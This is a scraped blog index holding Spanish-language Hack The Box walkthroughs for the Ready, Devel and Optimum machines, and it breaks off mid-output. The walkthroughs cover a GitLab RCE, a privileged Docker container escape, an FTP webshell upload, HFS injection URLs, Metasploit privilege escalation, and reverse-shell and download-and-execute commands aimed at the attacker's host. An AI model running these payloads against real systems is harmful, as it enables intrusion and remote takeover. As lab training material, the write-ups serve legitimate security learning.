OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 5080/tcp open http nginx | http-robots.txt: 53 disallowed entries (15 shown) | / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit | http-title: Sign in \\xC2\\xB7 GitLab |_Requested resource was http://10.10.10.220:5080/users/sign_in |_http-trane-info: Problem with XML parsing of /evox/about Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Feb 16 18:23:46 2021 -- 1 IP address (1 host up) scanned in 14.65 seconds   HTTP Encontramos Gitlab en el puerto http 5080.\nNos registarmos y logramos encontrar que la version es 11.4.7.\nGITLAB RCE - USER [CONTAINER] Realizamos una busqueda de vulnerabilidades para la version de gitlab, encontramos una la cual permite ejecucion remota de comandos, para que funcione requieren de autenticacion, estar registrado en la plataforma.\n1 2 3 4 5 6 7 8 9 10  ┌──(kali㉿kali)-[~/htb/ready/exploits] └─$ searchsploit gitlab 11.4.7 ------------------------------------------------------------------------------ --------------------------------- Exploit Title | Path ------------------------------------------------------------------------------ --------------------------------- GitLab 11.4.7 - RCE (Authenticated) | ruby/webapps/49334.py Gitlab 11.4.7 - Remote Code Execution | ruby/webapps/49257.py GitLab 11.4.7 - Remote Code Execution (Authenticated) | ruby/webapps/49263.py ------------------------------------------------------------------------------ --------------------------------- Shellcodes: No Results   Utilizamos el primer exploit al cual pasamos los parametros requeridos, logramos obtener una shell con el usuario git y la flag user.txt.\nROOT [CONTAINER] Realizamos una pequeña enumeracion en la maquina, encontramos que el lugar donde estamos es un contenedor docker, tambien una carpeta que contiene el \u0026ldquo;backup\u0026rdquo; de algunos archivos, entre ellos se encuentra el archivo de docker y backups de gitlab.\n1 2 3 4 5 6 7 8 9  ls -lah ls -lah total 112K drwxr-xr-x 2 root root 4.0K Dec 7 09:25 . drwxr-xr-x 1 root root 4.0K Dec 1 16:23 .. -rw-r--r-- 1 root root 872 Dec 7 09:25 docker-compose.yml -rw-r--r-- 1 root root 15K Dec 1 16:23 gitlab-secrets.json -rw-r--r-- 1 root root 78K Dec 1 19:20 gitlab.rb git@gitlab:/opt/backup$   En el archivo gitlab.rb encontramos una contraseña, utilizamos esta contraseña con el usuario root y logramos obtener una shell root dentro del contenedor.\n1 2  #git@gitlab:/opt/backup$ cat gitlab.rb | grep password |grep -v \u0026#39;^#\u0026#39; #gitlab_rails[\u0026#39;smtp_password\u0026#39;] = \u0026#34;wW59U!ZKMbG9+*#h\u0026#34;   PRIVILEGE ESCALATION Como se mencionó, encontramos el archivo del contenedor docker, con la configuracion de los puertos, servicios, red, etc. pero encontramos que el contenedor podria estar corriendo con \u0026ldquo;privilegios\u0026rdquo; (privileged: true).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  version: \u0026#39;2.4\u0026#39; services: web: image: \u0026#39;gitlab/gitlab-ce:11.4.7-ce.0\u0026#39; restart: always hostname: \u0026#39;gitlab.example.com\u0026#39; environment: GITLAB_OMNIBUS_CONFIG: | external_url \u0026#39;http://172.19.0.2\u0026#39; redis[\u0026#39;bind\u0026#39;]=\u0026#39;127.0.0.1\u0026#39; redis[\u0026#39;port\u0026#39;]=6379 gitlab_rails[\u0026#39;initial_root_password\u0026#39;]=File.read(\u0026#39;/root_pass\u0026#39;) networks: gitlab: ipv4_address: 172.19.0.2 ports: - \u0026#39;5080:80\u0026#39; #- \u0026#39;127.0.0.1:5080:80\u0026#39; #- \u0026#39;127.0.0.1:50443:443\u0026#39; #- \u0026#39;127.0.0.1:5022:22\u0026#39; volumes: - \u0026#39;./srv/gitlab/config:/etc/gitlab\u0026#39; - \u0026#39;./srv/gitlab/logs:/var/log/gitlab\u0026#39; - \u0026#39;./srv/gitlab/data:/var/opt/gitlab\u0026#39; - \u0026#39;./root_pass:/root_pass\u0026#39; privileged: true restart: unless-stopped #mem_limit: 1024m networks: gitlab: driver: bridge ipam: config: - subnet: 172.19.0.0/16   Realizamos la \u0026ldquo;explotacion\u0026rdquo; utilizando un PoC descrito en HackTricks con el cual logramos obtener una shell inversa y nuestra flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  # In the container mkdir /tmp/cgrp \u0026amp;\u0026amp; mount -t cgroup -o rdma cgroup /tmp/cgrp \u0026amp;\u0026amp; mkdir /tmp/cgrp/x echo 1 \u0026gt; /tmp/cgrp/x/notify_on_release host_path=`sed -n \u0026#39;s/.*\\perdir=\\([^,]*\\).*/\\1/p\u0026#39; /etc/mtab` echo \u0026#34;$host_path/cmd\u0026#34; \u0026gt; /tmp/cgrp/release_agent #Reverse shell echo \u0026#39;#!/bin/bash\u0026#39; \u0026gt; /cmd echo \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/1339 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt;\u0026gt; /cmd chmod a+x /cmd sh -c \u0026#34;echo \\$\\$ \u0026gt; /tmp/cgrp/x/cgroup.procs\u0026#34; #head /output   ","description":"En Ready encontramos una version de GitLab con una vulnerabilidad que aprovechamos para obtener acceso en un contenedor de Docker. Escalamos privilegios con contraseñas almacenadas, tras una enumeracion encontramos que el contenedor de Docker tiene la flag privileged activado lo que nos dio acceso como root en el Host.","id":8,"section":"posts","tags":["gitlab","gitlab 11.4.7","rce","docker escape","docker"],"title":"Hack The Box - Ready","uri":"https://sckull.github.io/posts/ready/"},{"content":"  Devel expone un servicio FTP, por medio de este logramos subir una webshell para ejecucion de comandos. Para escalar privilegios obtuvimos informacion del comando systeminfo que posteriormente utilizamos con Windows Exploit Suggester para obtener acceso privilegiado utilizando el exploit MS10-015 con Metasploit.\nInformacion de la Maquina    Nombre Devel      OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.5   Maker ch4p    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[4.4, 4.7, 6.2, 3.8, 5.3], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[0, 0, 0, 0, 0], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     NMAP Escaneo de puertos con nmap nos muestra el puerto ftp (21) y el puerto http (80) abierto.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  # Nmap 7.91 scan initiated Tue May 11 01:10:14 2021 as: nmap -Pn -p21,80 -sC -sV -oN port_scan 10.10.10.5 Nmap scan report for 10.10.10.5 (10.10.10.5) Host is up (0.11s latency). PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 03-18-17 02:06AM \u0026lt;DIR\u0026gt; aspnet_client | 03-17-17 05:37PM 689 iisstart.htm |_03-17-17 05:37PM 184946 welcome.png | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft IIS httpd 7.5 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 |_http-title: IIS7 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue May 11 01:10:23 2021 -- 1 IP address (1 host up) scanned in 9.64 seconds   FTP Enumeramos el servicio FTP y encontramos archivos y carpetas relacionadas a IIS.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  λ ~/htb/devel ftp 10.10.10.5 Connected to 10.10.10.5. 220 Microsoft FTP Service Name (10.10.10.5:kali): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp\u0026gt; dir 200 PORT command successful. 125 Data connection already open; Transfer starting. 03-18-17 02:06AM \u0026lt;DIR\u0026gt; aspnet_client 03-17-17 05:37PM 689 iisstart.htm 03-17-17 05:37PM 184946 welcome.png 226 Transfer complete. ftp\u0026gt; dir aspnet_client 200 PORT command successful. 125 Data connection already open; Transfer starting. 03-18-17 02:06AM \u0026lt;DIR\u0026gt; system_web 226 Transfer complete. ftp\u0026gt; dir aspnet_client/system_web 200 PORT command successful. 125 Data connection already open; Transfer starting. 03-18-17 02:06AM \u0026lt;DIR\u0026gt; 2_0_50727 226 Transfer complete. ftp\u0026gt; dir aspnet_client/system_web/2_0_50727 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. ftp\u0026gt; exit 221 Goodbye.   HTTP Encontramos una pagina estatica en el puerto 80 relacionada a IIS7.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos, solamente vemos la carpeta que encontramos en FTP.\n1 2  λ ~/htb/devel gobuster dir -u http://10.10.10.5/ -w /usr/share/wordlists/dirb/common.txt -q -t 35 -x php,html,txt,xml,asp,aspx /aspnet_client (Status: 301) [Size: 155] [--\u0026gt; http://10.10.10.5/aspnet_client/]   WEBSHELL Subimos una webshell en aspx que encontramos en kali /usr/share/webshells/aspx/ al servicio FTP, con el cual logramos ejecutar comandos.\n1 2 3 4 5 6 7  ftp\u0026gt; put cmdasp.aspx local: cmdasp.aspx remote: cmdasp.aspx 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 1442 bytes sent in 0.00 secs (38.2000 MB/s) ftp\u0026gt;   SHELL Ejecutamos un servidor samba y con netcat (nc.exe) ejecutamos una shell inversa.\n1 2 3 4 5 6 7 8  # \\\\10.10.14.17\\share\\nc.exe -e cmd.exe 10.10.14.17 80 λ ~/htb/devel sudo rlwrap nc -lvp 80 listening on [any] 80 ... connect to [10.10.14.17] from 10.10.10.5 [10.10.10.5] 49159 Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Microsoft Corporation. All rights reserved. c:\\windows\\system32\\inetsrv\u0026gt;   PRIVILEGE ESCALATION Realizamos una enumeracion con la herramienta Windows Exploit Suggester y encontramos que la version de la maquina (Windows 7 32-bit) podria ser vulnerable a multiples exploits, los que nos interesan son de Elevation of Privilege.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  λ ~/htb/devel python windows-exploit-suggester.py -i systeminfo -d 2021-05-11-mssb.xls [*] initiating winsploit version 3.3... [*] database file detected as xls or xlsx based on extension [*] attempting to read from the systeminfo input file [+] systeminfo input file read successfully (ascii) [*] querying database file for potential vulnerabilities [*] comparing the 0 hotfix(es) against the 179 potential bulletins(s) with a database of 137 known exploits [*] there are now 179 remaining vulns [+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin [+] windows version identified as \u0026#39;Windows 7 32-bit\u0026#39; [*] [M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical [M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important [E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical [*] http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP \u0026amp; EMET 5., PoC [*] http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP \u0026amp; EMET 5.0 Bypass (MS12-037), PoC [*] [E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important [M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important [M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical [E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important [E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important [M] MS10-015: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (977165) - Important [M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical [M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical [*] done   Creamos un payload de meterpreter en x86, subimos esta en el servicio FTP y la \u0026ldquo;ejecutamos\u0026rdquo; visitando la direccion, obtuvimos una sesion meterpreter.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  # msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=80 -f aspx -o reverse.aspx λ ~/htb/devel sudo msfconsole -q msf6 \u0026gt; use multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) \u0026gt; set payload windows/x86/meterpreter/reverse_tcp [-] The value specified for payload is not valid. msf6 exploit(multi/handler) \u0026gt; set payload windows/meterpreter/reverse_tcp payload =\u0026gt; windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) \u0026gt; set lhost tun0 lhost =\u0026gt; tun0 msf6 exploit(multi/handler) \u0026gt; set lport 80 lport =\u0026gt; 80 msf6 exploit(multi/handler) \u0026gt; run [*] Started reverse TCP handler on 10.10.14.17:80 [*] Sending stage (175174 bytes) to 10.10.10.5 [*] Meterpreter session 1 opened (10.10.14.17:80 -\u0026gt; 10.10.10.5:49160) at 2021-05-11 02:10:21 -0400 meterpreter \u0026gt; getuid Server username: IIS APPPOOL\\Web   Utilizamos el exploit MS10-015 que encontramos en metasploit, configuramos la sesion y LHOST, logramos obtener una shell con NT AUTHORITY\\SYSTEM.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  meterpreter \u0026gt; use exploit/windows/local/ms10_015_kitrap0d [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp msf6 exploit(windows/local/ms10_015_kitrap0d) \u0026gt; show options Module options (exploit/windows/local/ms10_015_kitrap0d): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on. Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: \u0026#39;\u0026#39;, seh, thread, process, none) LHOST 192.168.1.19 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Windows 2K SP4 - Windows 7 (x86) msf6 exploit(windows/local/ms10_015_kitrap0d) \u0026gt; set session 1 session =\u0026gt; 1 msf6 exploit(windows/local/ms10_015_kitrap0d) \u0026gt; set lhost tun0 lhost =\u0026gt; tun0 msf6 exploit(windows/local/ms10_015_kitrap0d) \u0026gt; run [*] Started reverse TCP handler on 10.10.14.17:4444 [*] Launching notepad to host the exploit... [+] Process 3188 launched. [*] Reflectively injecting the exploit DLL into 3188... [*] Injecting exploit into 3188 ... [*] Exploit injected. Injecting payload into 3188... [*] Payload injected. Executing exploit... [+] Exploit finished, wait for (hopefully privileged) payload execution to complete. [*] Sending stage (175174 bytes) to 10.10.10.5 [*] Meterpreter session 2 opened (10.10.14.17:4444 -\u0026gt; 10.10.10.5:49162) at 2021-05-11 02:18:47 -0400 meterpreter \u0026gt; getuid Server username: NT AUTHORITY\\SYSTEM meterpreter \u0026gt;   Tambien realizamos la lectura de las flag user.txt y root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  meterpreter \u0026gt; shell Process 1216 created. Channel 1 created. Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Users\\Public\\Documents\u0026gt; cd C:\\Users C:\\Users\u0026gt;dir babis\\Desktop\\ dir babis\\Desktop\\  Volume in drive C has no label. Volume Serial Number is 8620-71F1 Directory of C:\\Users\\babis\\Desktop 18/03/2017 02:14 \u0026lt;DIR\u0026gt; . 18/03/2017 02:14 \u0026lt;DIR\u0026gt; .. 18/03/2017 02:18 32 user.txt.txt 1 File(s) 32 bytes 2 Dir(s) 22.273.224.704 bytes free C:\\Users\u0026gt;type babis\\Desktop\\user.txt.txt type babis\\Desktop\\user.txt.txt 9ecdd6a3aedf24b41562fea70f4cb3e8 C:\\Users\u0026gt;dir Administrator\\Desktop dir Administrator\\Desktop Volume in drive C has no label. Volume Serial Number is 8620-71F1 Directory of C:\\Users\\Administrator\\Desktop 14/01/2021 12:42 \u0026lt;DIR\u0026gt; . 14/01/2021 12:42 \u0026lt;DIR\u0026gt; .. 18/03/2017 02:17 32 root.txt 1 File(s) 32 bytes 2 Dir(s) 22.273.224.704 bytes free C:\\Users\u0026gt;type Administrator\\Desktop\\root.txt type Administrator\\Desktop\\root.txt e621a0b5041708797c4fc4728bc72b4b C:\\Users\u0026gt;   ","description":"Devel expone un servicio FTP, por medio de este logramos subir una webshell para ejecucion de comandos. Para escalar privilegios obtuvimos informacion del comando systeminfo que posteriormente utilizamos con Windows Exploit Suggester para obtener acceso privilegiado utilizando el exploit MS10-015 con Metasploit.","id":9,"section":"posts","tags":["ftp","iis7","aspx","windows exploit suggester","MS10-015","metasploit"],"title":"Hack The Box - Devel","uri":"https://sckull.github.io/posts/devel/"},{"content":"  Optimum es una maquina de HackTheBox, descubrimos una vulnerabilidad en HttpFileServer que nos dio acceso. Obtuvimos informacion de con SystemInfo, con Windows Exploit Suggester y Sherlock lo que nos permitió explotar MS16-032.\nInformacion de la Maquina    Nombre Optimum      OS Windows   Puntos 20   Dificultad Facil   IP 10.10.10.8   Maker ch4p    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[4.4, 5.1, 6.5, 3.5, 4.9], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[0, 0, 0, 0, 0], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     NMAP Escaneo de puertos con nmap nos muestra el puerto http (80) abierto.\n1 2 3 4 5 6 7 8 9 10 11 12  # Nmap 7.91 scan initiated Wed May 12 00:32:26 2021 as: nmap -Pn -p80 -sC -sV -oN port_scan 10.10.10.8 Nmap scan report for 10.10.10.8 (10.10.10.8) Host is up (0.070s latency). PORT STATE SERVICE VERSION 80/tcp open http HttpFileServer httpd 2.3 |_http-server-header: HFS 2.3 |_http-title: HFS / Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed May 12 00:32:35 2021 -- 1 IP address (1 host up) scanned in 8.66 seconds   HTTP Encontramos una pagina en el puerto 80, donde vemos que esta corriendo HttpFileServer 2.3.\nUSER - KOSTAS HttpFileServer Encontramos un exploit que afecta a la version HttpFileServer 2.3.x, vemos que la version de HttpFileServer de Optimum está en el rango de version afectada, el exploit nos pide un servidor en el puerto 80 que contenga netcat (nc.exe). Ejecutamos el exploit y modificamos la direccion IP y Puerto para nuestra shell, logramos obtener una shell con el usuario kostas y la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  λ ~/htb/optimum sudo rlwrap nc -lvvp 443 listening on [any] 443 ... connect to [10.10.14.17] from 10.10.10.8 [10.10.10.8] 49166 Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\Users\\kostas\\Desktop\u0026gt; whoami optimum\\kostas C:\\Users\\kostas\\Desktop\u0026gt; dir Volume in drive C has no label. Volume Serial Number is D0BC-0196 Directory of C:\\Users\\kostas\\Desktop 18/05/2021 04:20 \u0026lt;DIR\u0026gt; . 18/05/2021 04:20 \u0026lt;DIR\u0026gt; .. 18/03/2017 03:11 760.320 hfs.exe 18/03/2017 03:13 32 user.txt.txt 2 File(s) 760.352 bytes 2 Dir(s) 31.882.153.984 bytes free C:\\Users\\kostas\\Desktop\u0026gt; type user.txt.txt d0c39409d7b994a9a1389ebf38ef5f73 C:\\Users\\kostas\\Desktop\u0026gt;   El exploit crea el archivo script.vbs y en el escribe una solicitud de descarga de nc.exe, realiza la ejecucion del script y la ejecucion de una shell inversa.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  # 1 http://10.10.10.8:80/?search=.{. save|C:\\Users\\Public\\script.vbs|dim xHttp: Set xHttp = createobject(\u0026#34;Microsoft.XMLHTTP\u0026#34;) dim bStrm: Set bStrm = createobject(\u0026#34;Adodb.Stream\u0026#34;) xHttp.Open \u0026#34;GET\u0026#34;, \u0026#34;http://10.10.14.17/nc.exe\u0026#34;, False xHttp.Send with bStrm .type = 1 \u0026#39;//binary .open .write xHttp.responseBody .savetofile \u0026#34;C:\\Users\\Public\\nc.exe\u0026#34;, 2 \u0026#39;//overwrite end with.} # 2 http://10.10.10.8:80/?search=.{. exec|cscript.exe C:\\Users\\Public\\script.vbs.} # 3 http://10.10.10.8:80/?search=.{. exec|C:\\Users\\Public\\nc.exe -e cmd.exe 10.10.14.17 443.}   Tambien vemos un segundo exploit el cual ejecuta una shell inversa usando powershell.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con systeminfo y la herramienta Windows Exploit Suggester, obtuvimos una lista de posibles vulnerabilidades de escalacioin de privilegios, tambien ejecutamos Sherlock para verificar si alguno de los exploits encontrados aparecia vulnerable.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  Host Name: OPTIMUM OS Name: Microsoft Windows Server 2012 R2 Standard OS Version: 6.3.9600 N/A Build 9600 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Multiprocessor Free [... REDACTED ...] # python ../www/windows-exploit-suggester.py -i systeminfo.txt -d 2021-05-12-mssb.xls | grep Elevation [*] https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege [E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important [M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important [E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important [E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important [M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important [*] https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC [E] MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege (3023266) - Important [E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical [*] http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC [E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important   Vemos MS16-032, MS16-034 y Win32k Elevation of Privilege que aparentemente es vulnerable.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  # powershell -nop -exec bypass -c \u0026#34;Import-Module .\\sherlock.ps1; Find-AllVulns\u0026#34; [... REDACTED ...] Title : Secondary Logon Handle MSBulletin : MS16-032 CVEID : 2016-0099 Link : https://www.exploit-db.com/exploits/39719/ VulnStatus : Appears Vulnerable Title : Windows Kernel-Mode Drivers EoP MSBulletin : MS16-034 CVEID : 2016-0093/94/95/96 Link : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1 6-034? VulnStatus : Appears Vulnerable Title : Win32k Elevation of Privilege MSBulletin : CVEID : 2016-7255 Link : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S ample-Exploits/MS16-135 VulnStatus : Appears Vulnerable   MS16-032 Creamos un payload de meterpreter y colocamos a la escucha metasploit, descargamos y ejecutamos en la maquina el payload y logramos obtener una sesion meterpreter.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34  # PAYLOAD: msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=8080 -f exe -o shell.exe # EXEC: certutil.exe -urlcache -f http://10.10.14.17/shell.exe shell.exe \u0026amp; shell.exe msf6 \u0026gt; use multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) \u0026gt; set payload windows/meterpreter/reverse_tcp payload =\u0026gt; windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) \u0026gt; set lhost tun0 lhost =\u0026gt; tun0 msf6 exploit(multi/handler) \u0026gt; set lport 80 msf6 exploit(multi/handler) \u0026gt; set lport 8080 lport =\u0026gt; 8080 msf6 exploit(multi/handler) \u0026gt; run -j [*] Exploit running as background job 0. [*] Exploit completed, but no session was created. [*] Started reverse TCP handler on 10.10.14.17:8080 msf6 exploit(multi/handler) \u0026gt; [*] Sending stage (175174 bytes) to 10.10.10.8 [*] Meterpreter session 1 opened (10.10.14.17:8080 -\u0026gt; 10.10.10.8:49192) at 2021-05-12 01:21:04 -0400 msf6 exploit(multi/handler) \u0026gt; msf6 exploit(multi/handler) \u0026gt; sessions Active sessions =============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 meterpreter x86/windows OPTIMUM\\kostas @ OPTIMUM 10.10.14.17:8080 -\u0026gt; 10.10.10.8:49192 (10.10.10.8) msf6 exploit(multi/handler) \u0026gt; sessions -i 1 [*] Starting interaction with 1... meterpreter \u0026gt; getuid Server username: OPTIMUM\\kostas   Configuramos el exploit MS16-032 (ms16_032_secondary_logon_handle_privesc) con la sesion activa, ejecutamos y logramos obtener una shell NT AUTHORITY\\SYSTEM y la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126  msf6 exploit(multi/handler) \u0026gt; use exploit/windows/local/ms16_032_secondary_logon_handle_privesc [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u0026gt; show options Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on. Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: \u0026#39;\u0026#39;, seh, thread, process, none) LHOST 192.168.1.21 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Windows x86 msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u0026gt; set session 1 session =\u0026gt; 1 msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u0026gt; set lhost tun0 lhost =\u0026gt; tun0 msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u0026gt; show options Module options 